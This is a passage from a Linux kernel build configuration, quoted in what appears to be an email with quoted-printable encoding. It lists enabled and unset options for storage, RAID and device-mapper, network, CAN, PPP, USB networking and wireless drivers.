> # CONFIG_SCSI_ISCI is not set
> # CONFIG_SCSI_IPS is not set
> # CONFIG_SCSI_INITIO is not set
> # CONFIG_SCSI_INIA100 is not set
> # CONFIG_SCSI_STEX is not set
> # CONFIG_SCSI_SYM53C8XX_2 is not set
> # CONFIG_SCSI_IPR is not set
> # CONFIG_SCSI_QLOGIC_1280 is not set
> # CONFIG_SCSI_QLA_FC is not set
> # CONFIG_SCSI_QLA_ISCSI is not set
> # CONFIG_SCSI_LPFC is not set
> # CONFIG_SCSI_EFCT is not set
> # CONFIG_SCSI_DC395x is not set
> # CONFIG_SCSI_AM53C974 is not set
> # CONFIG_SCSI_WD719X is not set
> # CONFIG_SCSI_DEBUG is not set
> # CONFIG_SCSI_PMCRAID is not set
> # CONFIG_SCSI_PM8001 is not set
> # CONFIG_SCSI_BFA_FC is not set
> CONFIG_SCSI_VIRTIO=3Dy
> # CONFIG_SCSI_CHELSIO_FCOE is not set
> # CONFIG_SCSI_LOWLEVEL_PCMCIA is not set
> # CONFIG_SCSI_DH is not set
> # end of SCSI device support
>=20
> CONFIG_ATA=3Dy
> CONFIG_SATA_HOST=3Dy
> CONFIG_PATA_TIMINGS=3Dy
> CONFIG_ATA_VERBOSE_ERROR=3Dy
> CONFIG_ATA_FORCE=3Dy
> CONFIG_ATA_ACPI=3Dy
> # CONFIG_SATA_ZPODD is not set
> CONFIG_SATA_PMP=3Dy
>=20
> #
> # Controllers with non-SFF native interface
> #
> CONFIG_SATA_AHCI=3Dy
> CONFIG_SATA_MOBILE_LPM_POLICY=3D3
> # CONFIG_SATA_AHCI_PLATFORM is not set
> # CONFIG_AHCI_DWC is not set
> # CONFIG_AHCI_CEVA is not set
> # CONFIG_SATA_INIC162X is not set
> # CONFIG_SATA_ACARD_AHCI is not set
> # CONFIG_SATA_SIL24 is not set
> CONFIG_ATA_SFF=3Dy
>=20
> #
> # SFF controllers with custom DMA interface
> #
> # CONFIG_PDC_ADMA is not set
> # CONFIG_SATA_QSTOR is not set
> # CONFIG_SATA_SX4 is not set
> CONFIG_ATA_BMDMA=3Dy
>=20
> #
> # SATA SFF controllers with BMDMA
> #
> CONFIG_ATA_PIIX=3Dy
> # CONFIG_SATA_DWC is not set
> # CONFIG_SATA_MV is not set
> # CONFIG_SATA_NV is not set
> # CONFIG_SATA_PROMISE is not set
> # CONFIG_SATA_SIL is not set
> # CONFIG_SATA_SIS is not set
> # CONFIG_SATA_SVW is not set
> # CONFIG_SATA_ULI is not set
> # CONFIG_SATA_VIA is not set
> # CONFIG_SATA_VITESSE is not set
>=20
> #
> # PATA SFF controllers with BMDMA
> #
> # CONFIG_PATA_ALI is not set
> CONFIG_PATA_AMD=3Dy
> # CONFIG_PATA_ARTOP is not set
> # CONFIG_PATA_ATIIXP is not set
> # CONFIG_PATA_ATP867X is not set
> # CONFIG_PATA_CMD64X is not set
> # CONFIG_PATA_CYPRESS is not set
> # CONFIG_PATA_EFAR is not set
> # CONFIG_PATA_HPT366 is not set
> # CONFIG_PATA_HPT37X is not set
> # CONFIG_PATA_HPT3X2N is not set
> # CONFIG_PATA_HPT3X3 is not set
> # CONFIG_PATA_IT8213 is not set
> # CONFIG_PATA_IT821X is not set
> # CONFIG_PATA_JMICRON is not set
> # CONFIG_PATA_MARVELL is not set
> # CONFIG_PATA_NETCELL is not set
> # CONFIG_PATA_NINJA32 is not set
> # CONFIG_PATA_NS87415 is not set
> CONFIG_PATA_OLDPIIX=3Dy
> # CONFIG_PATA_OPTIDMA is not set
> # CONFIG_PATA_PDC2027X is not set
> # CONFIG_PATA_PDC_OLD is not set
> # CONFIG_PATA_RADISYS is not set
> # CONFIG_PATA_RDC is not set
> CONFIG_PATA_SCH=3Dy
> # CONFIG_PATA_SERVERWORKS is not set
> # CONFIG_PATA_SIL680 is not set
> # CONFIG_PATA_SIS is not set
> # CONFIG_PATA_TOSHIBA is not set
> # CONFIG_PATA_TRIFLEX is not set
> # CONFIG_PATA_VIA is not set
> # CONFIG_PATA_WINBOND is not set
>=20
> #
> # PIO-only SFF controllers
> #
> # CONFIG_PATA_CMD640_PCI is not set
> # CONFIG_PATA_MPIIX is not set
> # CONFIG_PATA_NS87410 is not set
> # CONFIG_PATA_OPTI is not set
> # CONFIG_PATA_PCMCIA is not set
> # CONFIG_PATA_OF_PLATFORM is not set
> # CONFIG_PATA_RZ1000 is not set
>=20
> #
> # Generic fallback / legacy drivers
> #
> # CONFIG_PATA_ACPI is not set
> CONFIG_ATA_GENERIC=3Dy
> # CONFIG_PATA_LEGACY is not set
> CONFIG_MD=3Dy
> CONFIG_BLK_DEV_MD=3Dy
> CONFIG_MD_BITMAP=3Dy
> # CONFIG_MD_LLBITMAP is not set
> CONFIG_MD_AUTODETECT=3Dy
> CONFIG_MD_BITMAP_FILE=3Dy
> # CONFIG_MD_LINEAR is not set
> CONFIG_MD_RAID0=3Dy
> CONFIG_MD_RAID1=3Dy
> CONFIG_MD_RAID10=3Dy
> CONFIG_MD_RAID456=3Dy
> # CONFIG_MD_CLUSTER is not set
> CONFIG_BCACHE=3Dy
> # CONFIG_BCACHE_DEBUG is not set
> # CONFIG_BCACHE_ASYNC_REGISTRATION is not set
> CONFIG_BLK_DEV_DM_BUILTIN=3Dy
> CONFIG_BLK_DEV_DM=3Dy
> # CONFIG_DM_DEBUG is not set
> CONFIG_DM_BUFIO=3Dy
> # CONFIG_DM_DEBUG_BLOCK_MANAGER_LOCKING is not set
> CONFIG_DM_BIO_PRISON=3Dy
> CONFIG_DM_PERSISTENT_DATA=3Dy
> # CONFIG_DM_UNSTRIPED is not set
> CONFIG_DM_CRYPT=3Dy
> CONFIG_DM_SNAPSHOT=3Dy
> CONFIG_DM_THIN_PROVISIONING=3Dy
> CONFIG_DM_CACHE=3Dy
> CONFIG_DM_CACHE_SMQ=3Dy
> CONFIG_DM_WRITECACHE=3Dy
> # CONFIG_DM_EBS is not set
> # CONFIG_DM_ERA is not set
> CONFIG_DM_CLONE=3Dy
> CONFIG_DM_MIRROR=3Dy
> # CONFIG_DM_LOG_USERSPACE is not set
> CONFIG_DM_RAID=3Dy
> CONFIG_DM_ZERO=3Dy
> CONFIG_DM_MULTIPATH=3Dy
> CONFIG_DM_MULTIPATH_QL=3Dy
> CONFIG_DM_MULTIPATH_ST=3Dy
> # CONFIG_DM_MULTIPATH_HST is not set
> # CONFIG_DM_MULTIPATH_IOA is not set
> # CONFIG_DM_DELAY is not set
> # CONFIG_DM_DUST is not set
> # CONFIG_DM_INIT is not set
> CONFIG_DM_UEVENT=3Dy
> CONFIG_DM_FLAKEY=3Dy
> CONFIG_DM_VERITY=3Dy
> # CONFIG_DM_VERITY_VERIFY_ROOTHASH_SIG is not set
> CONFIG_DM_VERITY_FEC=3Dy
> # CONFIG_DM_SWITCH is not set
> # CONFIG_DM_LOG_WRITES is not set
> CONFIG_DM_INTEGRITY=3Dy
> CONFIG_DM_ZONED=3Dy
> CONFIG_DM_AUDIT=3Dy
> # CONFIG_DM_VDO is not set
> # CONFIG_DM_PCACHE is not set
> CONFIG_TARGET_CORE=3Dy
> # CONFIG_TCM_IBLOCK is not set
> # CONFIG_TCM_FILEIO is not set
> # CONFIG_TCM_PSCSI is not set
> # CONFIG_LOOPBACK_TARGET is not set
> # CONFIG_ISCSI_TARGET is not set
> # CONFIG_SBP_TARGET is not set
> # CONFIG_REMOTE_TARGET is not set
> # CONFIG_FUSION is not set
>=20
> #
> # IEEE 1394 (FireWire) support
> #
> CONFIG_FIREWIRE=3Dy
> CONFIG_FIREWIRE_OHCI=3Dy
> CONFIG_FIREWIRE_SBP2=3Dy
> CONFIG_FIREWIRE_NET=3Dy
> # CONFIG_FIREWIRE_NOSY is not set
> # end of IEEE 1394 (FireWire) support
>=20
> # CONFIG_MACINTOSH_DRIVERS is not set
> CONFIG_NETDEVICES=3Dy
> CONFIG_MII=3Dy
> CONFIG_NET_CORE=3Dy
> CONFIG_BONDING=3Dy
> CONFIG_DUMMY=3Dy
> CONFIG_WIREGUARD=3Dy
> # CONFIG_WIREGUARD_DEBUG is not set
> # CONFIG_OVPN is not set
> CONFIG_EQUALIZER=3Dy
> CONFIG_NET_FC=3Dy
> CONFIG_IFB=3Dy
> CONFIG_NET_TEAM=3Dy
> CONFIG_NET_TEAM_MODE_BROADCAST=3Dy
> CONFIG_NET_TEAM_MODE_ROUNDROBIN=3Dy
> CONFIG_NET_TEAM_MODE_RANDOM=3Dy
> CONFIG_NET_TEAM_MODE_ACTIVEBACKUP=3Dy
> CONFIG_NET_TEAM_MODE_LOADBALANCE=3Dy
> CONFIG_MACVLAN=3Dy
> CONFIG_MACVTAP=3Dy
> CONFIG_IPVLAN_L3S=3Dy
> CONFIG_IPVLAN=3Dy
> CONFIG_IPVTAP=3Dy
> CONFIG_VXLAN=3Dy
> CONFIG_GENEVE=3Dy
> CONFIG_BAREUDP=3Dy
> CONFIG_GTP=3Dy
> # CONFIG_PFCP is not set
> # CONFIG_AMT is not set
> CONFIG_MACSEC=3Dy
> CONFIG_NETCONSOLE=3Dy
> # CONFIG_NETCONSOLE_DYNAMIC is not set
> # CONFIG_NETCONSOLE_EXTENDED_LOG is not set
> CONFIG_NETPOLL=3Dy
> CONFIG_NET_POLL_CONTROLLER=3Dy
> CONFIG_TUN=3Dy
> CONFIG_TAP=3Dy
> CONFIG_TUN_VNET_CROSS_LE=3Dy
> CONFIG_VETH=3Dy
> CONFIG_VIRTIO_NET=3Dy
> CONFIG_NLMON=3Dy
> # CONFIG_NETKIT is not set
> CONFIG_NET_VRF=3Dy
> CONFIG_VSOCKMON=3Dy
> # CONFIG_MHI_NET is not set
> # CONFIG_ARCNET is not set
> CONFIG_ATM_DRIVERS=3Dy
> # CONFIG_ATM_DUMMY is not set
> CONFIG_ATM_TCP=3Dy
> # CONFIG_ATM_LANAI is not set
> # CONFIG_ATM_ENI is not set
> # CONFIG_ATM_NICSTAR is not set
> # CONFIG_ATM_IDT77252 is not set
> # CONFIG_ATM_IA is not set
> # CONFIG_ATM_FORE200E is not set
> # CONFIG_ATM_HE is not set
> # CONFIG_ATM_SOLOS is not set
> CONFIG_CAIF_DRIVERS=3Dy
> CONFIG_CAIF_TTY=3Dy
> CONFIG_CAIF_VIRTIO=3Dy
>=20
> #
> # Distributed Switch Architecture drivers
> #
> # CONFIG_B53 is not set
> # CONFIG_NET_DSA_BCM_SF2 is not set
> # CONFIG_NET_DSA_LOOP is not set
> # CONFIG_NET_DSA_HIRSCHMANN_HELLCREEK is not set
> # CONFIG_NET_DSA_LANTIQ_GSWIP is not set
> # CONFIG_NET_DSA_MXL_GSW1XX is not set
> # CONFIG_NET_DSA_MT7530 is not set
> # CONFIG_NET_DSA_MV88E6060 is not set
> # CONFIG_NET_DSA_MICROCHIP_KSZ_COMMON is not set
> # CONFIG_NET_DSA_MV88E6XXX is not set
> # CONFIG_NET_DSA_MXL862 is not set
> # CONFIG_NET_DSA_AR9331 is not set
> # CONFIG_NET_DSA_QCA8K is not set
> # CONFIG_NET_DSA_SJA1105 is not set
> # CONFIG_NET_DSA_XRS700X_I2C is not set
> # CONFIG_NET_DSA_XRS700X_MDIO is not set
> # CONFIG_NET_DSA_REALTEK is not set
> # CONFIG_NET_DSA_KS8995 is not set
> # CONFIG_NET_DSA_SMSC_LAN9303_I2C is not set
> # CONFIG_NET_DSA_SMSC_LAN9303_MDIO is not set
> # CONFIG_NET_DSA_VITESSE_VSC73XX_SPI is not set
> # CONFIG_NET_DSA_VITESSE_VSC73XX_PLATFORM is not set
> # CONFIG_NET_DSA_YT921X is not set
> # end of Distributed Switch Architecture drivers
>=20
> CONFIG_ETHERNET=3Dy
> # CONFIG_NET_VENDOR_3COM is not set
> # CONFIG_NET_VENDOR_ADAPTEC is not set
> # CONFIG_NET_VENDOR_AGERE is not set
> # CONFIG_NET_VENDOR_ALACRITECH is not set
> CONFIG_NET_VENDOR_ALTEON=3Dy
> # CONFIG_ACENIC is not set
> # CONFIG_ALTERA_TSE is not set
> CONFIG_NET_VENDOR_AMAZON=3Dy
> # CONFIG_ENA_ETHERNET is not set
> # CONFIG_NET_VENDOR_AMD is not set
> # CONFIG_NET_VENDOR_AQUANTIA is not set
> # CONFIG_NET_VENDOR_ARC is not set
> CONFIG_NET_VENDOR_ASIX=3Dy
> # CONFIG_SPI_AX88796C is not set
> # CONFIG_NET_VENDOR_ATHEROS is not set
> # CONFIG_CX_ECAT is not set
> # CONFIG_NET_VENDOR_BROADCOM is not set
> # CONFIG_NET_VENDOR_CADENCE is not set
> # CONFIG_NET_VENDOR_CAVIUM is not set
> # CONFIG_NET_VENDOR_CHELSIO is not set
> CONFIG_NET_VENDOR_CISCO=3Dy
> # CONFIG_ENIC is not set
> # CONFIG_NET_VENDOR_CORTINA is not set
> CONFIG_NET_VENDOR_DAVICOM=3Dy
> # CONFIG_DM9051 is not set
> # CONFIG_NET_VENDOR_DEC is not set
> # CONFIG_NET_VENDOR_DLINK is not set
> # CONFIG_NET_VENDOR_EMULEX is not set
> CONFIG_NET_VENDOR_ENGLEDER=3Dy
> # CONFIG_TSNEP is not set
> # CONFIG_NET_VENDOR_EZCHIP is not set
> # CONFIG_NET_VENDOR_FUJITSU is not set
> CONFIG_NET_VENDOR_FUNGIBLE=3Dy
> # CONFIG_FUN_ETH is not set
> CONFIG_NET_VENDOR_GOOGLE=3Dy
> CONFIG_GVE=3Dy
> CONFIG_NET_VENDOR_HISILICON=3Dy
> # CONFIG_HIBMCGE is not set
> # CONFIG_NET_VENDOR_HUAWEI is not set
> CONFIG_NET_VENDOR_I825XX=3Dy
> CONFIG_NET_VENDOR_INTEL=3Dy
> CONFIG_E100=3Dy
> CONFIG_E1000=3Dy
> CONFIG_E1000E=3Dy
> CONFIG_E1000E_HWTS=3Dy
> # CONFIG_IGB is not set
> # CONFIG_IGBVF is not set
> # CONFIG_IXGBE is not set
> # CONFIG_IXGBEVF is not set
> # CONFIG_I40E is not set
> # CONFIG_I40EVF is not set
> # CONFIG_ICE is not set
> # CONFIG_FM10K is not set
> # CONFIG_IGC is not set
> # CONFIG_IDPF is not set
> # CONFIG_JME is not set
> # CONFIG_NET_VENDOR_ADI is not set
> CONFIG_NET_VENDOR_LITEX=3Dy
> # CONFIG_LITEX_LITEETH is not set
> # CONFIG_NET_VENDOR_MARVELL is not set
> CONFIG_NET_VENDOR_MELLANOX=3Dy
> # CONFIG_MLX4_EN is not set
> CONFIG_MLX4_CORE=3Dy
> # CONFIG_MLX4_DEBUG is not set
> # CONFIG_MLX4_CORE_GEN2 is not set
> # CONFIG_MLX5_CORE is not set
> # CONFIG_MLXSW_CORE is not set
> # CONFIG_MLXFW is not set
> CONFIG_NET_VENDOR_META=3Dy
> # CONFIG_FBNIC is not set
> # CONFIG_NET_VENDOR_MICREL is not set
> # CONFIG_NET_VENDOR_MICROCHIP is not set
> # CONFIG_NET_VENDOR_MICROSEMI is not set
> CONFIG_NET_VENDOR_MICROSOFT=3Dy
> CONFIG_NET_VENDOR_MUCSE=3Dy
> # CONFIG_MGBE is not set
> # CONFIG_NET_VENDOR_MYRI is not set
> # CONFIG_FEALNX is not set
> # CONFIG_NET_VENDOR_NI is not set
> # CONFIG_NET_VENDOR_NATSEMI is not set
> # CONFIG_NET_VENDOR_NETRONOME is not set
> # CONFIG_NET_VENDOR_NVIDIA is not set
> # CONFIG_NET_VENDOR_OKI is not set
> # CONFIG_ETHOC is not set
> # CONFIG_NET_VENDOR_PACKET_ENGINES is not set
> # CONFIG_NET_VENDOR_PENSANDO is not set
> # CONFIG_NET_VENDOR_QLOGIC is not set
> # CONFIG_NET_VENDOR_BROCADE is not set
> # CONFIG_NET_VENDOR_QUALCOMM is not set
> # CONFIG_NET_VENDOR_RDC is not set
> # CONFIG_NET_VENDOR_REALTEK is not set
> # CONFIG_NET_VENDOR_RENESAS is not set
> # CONFIG_NET_VENDOR_ROCKER is not set
> # CONFIG_NET_VENDOR_SAMSUNG is not set
> # CONFIG_NET_VENDOR_SEEQ is not set
> # CONFIG_NET_VENDOR_SILAN is not set
> # CONFIG_NET_VENDOR_SIS is not set
> # CONFIG_NET_VENDOR_SOLARFLARE is not set
> # CONFIG_NET_VENDOR_SMSC is not set
> # CONFIG_NET_VENDOR_SOCIONEXT is not set
> # CONFIG_NET_VENDOR_STMICRO is not set
> # CONFIG_NET_VENDOR_SUN is not set
> # CONFIG_NET_VENDOR_SYNOPSYS is not set
> # CONFIG_NET_VENDOR_TEHUTI is not set
> # CONFIG_NET_VENDOR_TI is not set
> CONFIG_NET_VENDOR_VERTEXCOM=3Dy
> # CONFIG_MSE102X is not set
> # CONFIG_NET_VENDOR_VIA is not set
> CONFIG_NET_VENDOR_WANGXUN=3Dy
> # CONFIG_NGBE is not set
> # CONFIG_TXGBE is not set
> # CONFIG_TXGBEVF is not set
> # CONFIG_NGBEVF is not set
> # CONFIG_NET_VENDOR_WIZNET is not set
> # CONFIG_NET_VENDOR_XILINX is not set
> # CONFIG_NET_VENDOR_XIRCOM is not set
> CONFIG_FDDI=3Dy
> # CONFIG_DEFXX is not set
> # CONFIG_SKFP is not set
> CONFIG_MDIO_BUS=3Dy
> CONFIG_PHYLINK=3Dy
> CONFIG_PHYLIB=3Dy
> CONFIG_SWPHY=3Dy
> # CONFIG_LED_TRIGGER_PHY is not set
> CONFIG_PHYLIB_LEDS=3Dy
> CONFIG_FIXED_PHY=3Dy
> # CONFIG_SFP is not set
>=20
> #
> # MII PHY device drivers
> #
> # CONFIG_AS21XXX_PHY is not set
> # CONFIG_AIR_EN8811H_PHY is not set
> # CONFIG_AMD_PHY is not set
> # CONFIG_ADIN_PHY is not set
> # CONFIG_ADIN1100_PHY is not set
> # CONFIG_AQUANTIA_PHY is not set
> CONFIG_AX88796B_PHY=3Dy
> # CONFIG_BROADCOM_PHY is not set
> # CONFIG_BCM54140_PHY is not set
> # CONFIG_BCM7XXX_PHY is not set
> # CONFIG_BCM84881_PHY is not set
> # CONFIG_BCM87XX_PHY is not set
> # CONFIG_CICADA_PHY is not set
> # CONFIG_CORTINA_PHY is not set
> # CONFIG_DAVICOM_PHY is not set
> # CONFIG_ICPLUS_PHY is not set
> # CONFIG_LXT_PHY is not set
> # CONFIG_INTEL_XWAY_PHY is not set
> # CONFIG_LSI_ET1011C_PHY is not set
> # CONFIG_MARVELL_PHY is not set
> # CONFIG_MARVELL_10G_PHY is not set
> # CONFIG_MARVELL_88Q2XXX_PHY is not set
> # CONFIG_MARVELL_88X2222_PHY is not set
> # CONFIG_MAXLINEAR_GPHY is not set
> # CONFIG_MAXLINEAR_86110_PHY is not set
> # CONFIG_MEDIATEK_GE_PHY is not set
> # CONFIG_MICREL_PHY is not set
> # CONFIG_MICROCHIP_T1S_PHY is not set
> CONFIG_MICROCHIP_PHY=3Dy
> # CONFIG_MICROCHIP_T1_PHY is not set
> # CONFIG_MICROSEMI_PHY is not set
> # CONFIG_MOTORCOMM_PHY is not set
> # CONFIG_NATIONAL_PHY is not set
> # CONFIG_NXP_CBTX_PHY is not set
> # CONFIG_NXP_C45_TJA11XX_PHY is not set
> # CONFIG_NXP_TJA11XX_PHY is not set
> # CONFIG_NCN26000_PHY is not set
> # CONFIG_AT803X_PHY is not set
> # CONFIG_QCA83XX_PHY is not set
> # CONFIG_QCA808X_PHY is not set
> # CONFIG_QCA807X_PHY is not set
> # CONFIG_QSEMI_PHY is not set
> CONFIG_REALTEK_PHY=3Dy
> # CONFIG_REALTEK_PHY_HWMON is not set
> # CONFIG_RENESAS_PHY is not set
> # CONFIG_ROCKCHIP_PHY is not set
> CONFIG_SMSC_PHY=3Dy
> # CONFIG_STE10XP is not set
> # CONFIG_TERANETICS_PHY is not set
> # CONFIG_DP83822_PHY is not set
> # CONFIG_DP83TC811_PHY is not set
> # CONFIG_DP83848_PHY is not set
> # CONFIG_DP83867_PHY is not set
> # CONFIG_DP83869_PHY is not set
> # CONFIG_DP83TD510_PHY is not set
> # CONFIG_DP83TG720_PHY is not set
> # CONFIG_VITESSE_PHY is not set
> # CONFIG_XILINX_GMII2RGMII is not set
> # CONFIG_PSE_CONTROLLER is not set
> CONFIG_CAN_DEV=3Dy
> CONFIG_CAN_VCAN=3Dy
> CONFIG_CAN_VXCAN=3Dy
> CONFIG_CAN_NETLINK=3Dy
> CONFIG_CAN_CALC_BITTIMING=3Dy
> CONFIG_CAN_RX_OFFLOAD=3Dy
> # CONFIG_CAN_CAN327 is not set
> # CONFIG_CAN_DUMMY is not set
> # CONFIG_CAN_FLEXCAN is not set
> # CONFIG_CAN_GRCAN is not set
> # CONFIG_CAN_KVASER_PCIEFD is not set
> CONFIG_CAN_SLCAN=3Dy
> # CONFIG_CAN_C_CAN is not set
> # CONFIG_CAN_CC770 is not set
> # CONFIG_CAN_CTUCANFD_PCI is not set
> # CONFIG_CAN_CTUCANFD_PLATFORM is not set
> # CONFIG_CAN_ESD_402_PCI is not set
> CONFIG_CAN_IFI_CANFD=3Dy
> # CONFIG_CAN_M_CAN is not set
> # CONFIG_CAN_PEAK_PCIEFD is not set
> # CONFIG_CAN_SJA1000 is not set
> # CONFIG_CAN_SOFTING is not set
>=20
> #
> # CAN SPI interfaces
> #
> # CONFIG_CAN_HI311X is not set
> # CONFIG_CAN_MCP251X is not set
> # CONFIG_CAN_MCP251XFD is not set
> # end of CAN SPI interfaces
>=20
> #
> # CAN USB interfaces
> #
> CONFIG_CAN_8DEV_USB=3Dy
> CONFIG_CAN_EMS_USB=3Dy
> CONFIG_CAN_ESD_USB=3Dy
> CONFIG_CAN_ETAS_ES58X=3Dy
> CONFIG_CAN_F81604=3Dy
> CONFIG_CAN_GS_USB=3Dy
> CONFIG_CAN_KVASER_USB=3Dy
> CONFIG_CAN_MCBA_USB=3Dy
> CONFIG_CAN_PEAK_USB=3Dy
> CONFIG_CAN_UCAN=3Dy
> # end of CAN USB interfaces
>=20
> # CONFIG_CAN_DEBUG_DEVICES is not set
>=20
> #
> # MCTP Device Drivers
> #
> # CONFIG_MCTP_SERIAL is not set
> # CONFIG_MCTP_TRANSPORT_I2C is not set
> # CONFIG_MCTP_TRANSPORT_USB is not set
> # end of MCTP Device Drivers
>=20
> CONFIG_FWNODE_MDIO=3Dy
> CONFIG_OF_MDIO=3Dy
> CONFIG_ACPI_MDIO=3Dy
> # CONFIG_MDIO_BITBANG is not set
> # CONFIG_MDIO_BCM_UNIMAC is not set
> # CONFIG_MDIO_HISI_FEMAC is not set
> CONFIG_MDIO_MVUSB=3Dy
> # CONFIG_MDIO_MSCC_MIIM is not set
> # CONFIG_MDIO_OCTEON is not set
> # CONFIG_MDIO_IPQ4019 is not set
> # CONFIG_MDIO_IPQ8064 is not set
> # CONFIG_MDIO_THUNDER is not set
>=20
> #
> # MDIO Multiplexers
> #
> # CONFIG_MDIO_BUS_MUX_GPIO is not set
> # CONFIG_MDIO_BUS_MUX_MULTIPLEXER is not set
> # CONFIG_MDIO_BUS_MUX_MMIOREG is not set
>=20
> #
> # PCS device drivers
> #
> # CONFIG_PCS_XPCS is not set
> # end of PCS device drivers
>=20
> # CONFIG_PLIP is not set
> CONFIG_PPP=3Dy
> CONFIG_PPP_BSDCOMP=3Dy
> CONFIG_PPP_DEFLATE=3Dy
> CONFIG_PPP_FILTER=3Dy
> CONFIG_PPP_MPPE=3Dy
> CONFIG_PPP_MULTILINK=3Dy
> CONFIG_PPPOATM=3Dy
> CONFIG_PPPOE=3Dy
> CONFIG_PPPOE_HASH_BITS_1=3Dy
> # CONFIG_PPPOE_HASH_BITS_2 is not set
> # CONFIG_PPPOE_HASH_BITS_4 is not set
> # CONFIG_PPPOE_HASH_BITS_8 is not set
> CONFIG_PPPOE_HASH_BITS=3D1
> CONFIG_PPTP=3Dy
> CONFIG_PPPOL2TP=3Dy
> CONFIG_PPP_ASYNC=3Dy
> CONFIG_PPP_SYNC_TTY=3Dy
> CONFIG_SLIP=3Dy
> CONFIG_SLHC=3Dy
> CONFIG_SLIP_COMPRESSED=3Dy
> CONFIG_SLIP_SMART=3Dy
> CONFIG_SLIP_MODE_SLIP6=3Dy
> CONFIG_USB_NET_DRIVERS=3Dy
> CONFIG_USB_CATC=3Dy
> CONFIG_USB_KAWETH=3Dy
> CONFIG_USB_PEGASUS=3Dy
> CONFIG_USB_RTL8150=3Dy
> CONFIG_USB_RTL8152=3Dy
> CONFIG_USB_LAN78XX=3Dy
> CONFIG_USB_USBNET=3Dy
> CONFIG_USB_NET_AX8817X=3Dy
> CONFIG_USB_NET_AX88179_178A=3Dy
> CONFIG_USB_NET_CDCETHER=3Dy
> CONFIG_USB_NET_CDC_EEM=3Dy
> CONFIG_USB_NET_CDC_NCM=3Dy
> CONFIG_USB_NET_HUAWEI_CDC_NCM=3Dy
> CONFIG_USB_NET_CDC_MBIM=3Dy
> CONFIG_USB_NET_DM9601=3Dy
> CONFIG_USB_NET_SR9700=3Dy
> CONFIG_USB_NET_SR9800=3Dy
> CONFIG_USB_NET_SMSC75XX=3Dy
> CONFIG_USB_NET_SMSC95XX=3Dy
> CONFIG_USB_NET_GL620A=3Dy
> CONFIG_USB_NET_NET1080=3Dy
> CONFIG_USB_NET_PLUSB=3Dy
> CONFIG_USB_NET_MCS7830=3Dy
> CONFIG_USB_NET_RNDIS_HOST=3Dy
> CONFIG_USB_NET_CDC_SUBSET_ENABLE=3Dy
> CONFIG_USB_NET_CDC_SUBSET=3Dy
> CONFIG_USB_ALI_M5632=3Dy
> CONFIG_USB_AN2720=3Dy
> CONFIG_USB_BELKIN=3Dy
> CONFIG_USB_ARMLINUX=3Dy
> CONFIG_USB_EPSON2888=3Dy
> CONFIG_USB_KC2190=3Dy
> CONFIG_USB_NET_ZAURUS=3Dy
> CONFIG_USB_NET_CX82310_ETH=3Dy
> CONFIG_USB_NET_KALMIA=3Dy
> CONFIG_USB_NET_QMI_WWAN=3Dy
> CONFIG_USB_HSO=3Dy
> CONFIG_USB_NET_INT51X1=3Dy
> CONFIG_USB_CDC_PHONET=3Dy
> CONFIG_USB_IPHETH=3Dy
> CONFIG_USB_SIERRA_NET=3Dy
> CONFIG_USB_VL600=3Dy
> CONFIG_USB_NET_CH9200=3Dy
> CONFIG_USB_NET_AQC111=3Dy
> CONFIG_USB_RTL8153_ECM=3Dy
> CONFIG_WLAN=3Dy
> CONFIG_WLAN_VENDOR_ADMTEK=3Dy
> # CONFIG_ADM8211 is not set
> CONFIG_ATH_COMMON=3Dy
> CONFIG_WLAN_VENDOR_ATH=3Dy
> # CONFIG_ATH_DEBUG is not set
> # CONFIG_ATH5K is not set
> # CONFIG_ATH5K_PCI is not set
> CONFIG_ATH9K_HW=3Dy
> CONFIG_ATH9K_COMMON=3Dy
> CONFIG_ATH9K_COMMON_DEBUG=3Dy
> CONFIG_ATH9K_BTCOEX_SUPPORT=3Dy
> CONFIG_ATH9K=3Dy
> CONFIG_ATH9K_PCI=3Dy
> CONFIG_ATH9K_AHB=3Dy
> CONFIG_ATH9K_DEBUGFS=3Dy
> # CONFIG_ATH9K_STATION_STATISTICS is not set
> CONFIG_ATH9K_DYNACK=3Dy
> # CONFIG_ATH9K_WOW is not set
> CONFIG_ATH9K_RFKILL=3Dy
> CONFIG_ATH9K_CHANNEL_CONTEXT=3Dy
> CONFIG_ATH9K_PCOEM=3Dy
> # CONFIG_ATH9K_PCI_NO_EEPROM is not set
> CONFIG_ATH9K_HTC=3Dy
> CONFIG_ATH9K_HTC_DEBUGFS=3Dy
> # CONFIG_ATH9K_HWRNG is not set
> CONFIG_ATH9K_COMMON_SPECTRAL=3Dy
> CONFIG_CARL9170=3Dy
> CONFIG_CARL9170_LEDS=3Dy
> # CONFIG_CARL9170_DEBUGFS is not set
> CONFIG_CARL9170_WPC=3Dy
> CONFIG_CARL9170_HWRNG=3Dy
> CONFIG_ATH6KL=3Dy
> # CONFIG_ATH6KL_SDIO is not set
> CONFIG_ATH6KL_USB=3Dy
> # CONFIG_ATH6KL_DEBUG is not set
> # CONFIG_ATH6KL_TRACING is not set
> CONFIG_AR5523=3Dy
> # CONFIG_WIL6210 is not set
> CONFIG_ATH10K=3Dy
> CONFIG_ATH10K_CE=3Dy
> CONFIG_ATH10K_PCI=3Dy
> # CONFIG_ATH10K_AHB is not set
> # CONFIG_ATH10K_SDIO is not set
> CONFIG_ATH10K_USB=3Dy
> # CONFIG_ATH10K_DEBUG is not set
> # CONFIG_ATH10K_DEBUGFS is not set
> CONFIG_ATH10K_LEDS=3Dy
> # CONFIG_ATH10K_TRACING is not set
> # CONFIG_WCN36XX is not set
> CONFIG_ATH11K=3Dy
> # CONFIG_ATH11K_PCI is not set
> # CONFIG_ATH11K_DEBUG is not set
> # CONFIG_ATH11K_DEBUGFS is not set
> # CONFIG_ATH11K_TRACING is not set
> # CONFIG_ATH12K is not set
> # CONFIG_WLAN_VENDOR_ATMEL is not set
> # CONFIG_WLAN_VENDOR_BROADCOM is not set
> # CONFIG_WLAN_VENDOR_INTEL is not set
> # CONFIG_WLAN_VENDOR_INTERSIL is not set
> # CONFIG_WLAN_VENDOR_MARVELL is not set
> # CONFIG_WLAN_VENDOR_MEDIATEK is not set
> # CONFIG_WLAN_VENDOR_MICROCHIP is not set
> CONFIG_WLAN_VENDOR_PURELIFI=3Dy
> CONFIG_PLFXLC=3Dy
> # CONFIG_WLAN_VENDOR_RALINK is not set
> # CONFIG_WLAN_VENDOR_REALTEK is not set
> # CONFIG_WLAN_VENDOR_RSI is not set
> CONFIG_WLAN_VENDOR_SILABS=3Dy
> # CONFIG_WFX is not set
> # CONFIG_WLAN_VENDOR_ST is not set
> # CONFIG_WLAN_VENDOR_TI is not set
> # CONFIG_WLAN_VENDOR_ZYDAS is not set
> # CONFIG_WLAN_VENDOR_QUANTENNA is not set
